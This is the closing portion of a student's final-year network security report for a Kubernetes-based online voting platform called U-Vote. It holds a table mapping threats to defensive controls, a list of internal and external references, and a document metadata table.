| Supply Chain Attack | Default-deny (limits compromised pod blast radius) | — | Credentials required | Image scanning (planned), OPA (planned) |
| Data Exfiltration | Default-deny egress (no internet), restricted DNS | — | Per-service permissions | — |
| Session Hijacking | Policy restrictions (auth isolated) | JWT expiry, audit logging | — | mTLS (planned) |
| Privilege Escalation | Per-pod policies (limited reach) | API authorisation checks | Per-service DB users | No privileged containers, minimal RBAC |

---

### Appendix F: Documentation References

#### Internal Project Documents

| Document | Description | Relevance |
|---|---|---|
| ARCHITECTURE.MD | System architecture, service descriptions, database schema | Service communication patterns, DB user permissions |
| PLATFORM.MD | Kubernetes platform documentation, deployment manifests | Network policy model, Kind cluster configuration |
| BUILD-LOG.md | Development build log and decisions | Implementation rationale and technical decisions |
| 00-default-deny.yaml | Default deny NetworkPolicy | Zero-trust baseline implementation |
| 01-allow-dns.yaml | DNS allow NetworkPolicy | DNS resolution access control |
| 02-allow-to-database.yaml | Database access NetworkPolicy | Database ingress/egress control |
| 03-allow-from-ingress.yaml | Ingress controller NetworkPolicy | External access control |
| 04-allow-audit.yaml | Audit service NetworkPolicy | Audit logging access control |
| test-pods.yaml | Network policy test pods | Testing infrastructure |

#### External References

| Reference | URL | Topic |
|---|---|---|
| Kubernetes NetworkPolicy | https://kubernetes.io/docs/concepts/services-networking/network-policies/ | NetworkPolicy specification and semantics |
| Calico Documentation | https://docs.tigera.io/calico/latest/about/ | Calico CNI architecture and policy enforcement |
| CIS Kubernetes Benchmark | https://www.cisecurity.org/benchmark/kubernetes | Kubernetes security best practices |
| OWASP Top 10 (2021) | https://owasp.org/Top10/ | Web application security risks |
| NIST SP 800-207 | https://csrc.nist.gov/publications/detail/sp/800-207/final | Zero Trust Architecture |
| STRIDE Threat Model | https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats | STRIDE methodology reference |
| Kind Documentation | https://kind.sigs.k8s.io/ | Kubernetes in Docker cluster |
| Nginx Ingress Controller | https://kubernetes.github.io/ingress-nginx/ | Ingress controller configuration |
| Falco Documentation | https://falco.org/docs/ | Runtime security monitoring |
| HashiCorp Vault | https://developer.hashicorp.com/vault | Secret management |
| SPIFFE/SPIRE | https://spiffe.io/ | Workload identity framework |
| Open Policy Agent | https://www.openpolicyagent.org/ | Policy-based admission control |
| Trivy Scanner | https://aquasecurity.github.io/trivy/ | Container image vulnerability scanning |

---

## Document Metadata

| Field | Value |
|---|---|
| **Document Title** | U-Vote Platform: Comprehensive Network Security Documentation |
| **Document Classification** | Academic Technical Documentation |
| **Project** | U-Vote — Secure Online Voting Platform |
| **Module** | BSc (Hons) Year 4 Final Project |
| **Student ID** | D00256764 |
| **Date Created** | February 2026 |
| **Last Updated** | February 2026 |
| **Version** | 1.0 |
| **Status** | Complete |
| **Total Sections** | 12 + 6 Appendices |
| **Scope** | Network security architecture, threat modelling, testing, compliance, and operational security |
| **Platform** | Kubernetes (Kind, 3-node cluster), Calico CNI v3.26.1 |
| **Namespace** | uvote-dev |
| **Services Documented** | 8 microservices + 1 PostgreSQL database |
| **NetworkPolicies Documented** | 12 policies across 5 YAML manifests |
| **Threats Documented** | 15 external threats + 4 compromised service scenarios + 6 attack scenarios |

---

*End of Document*
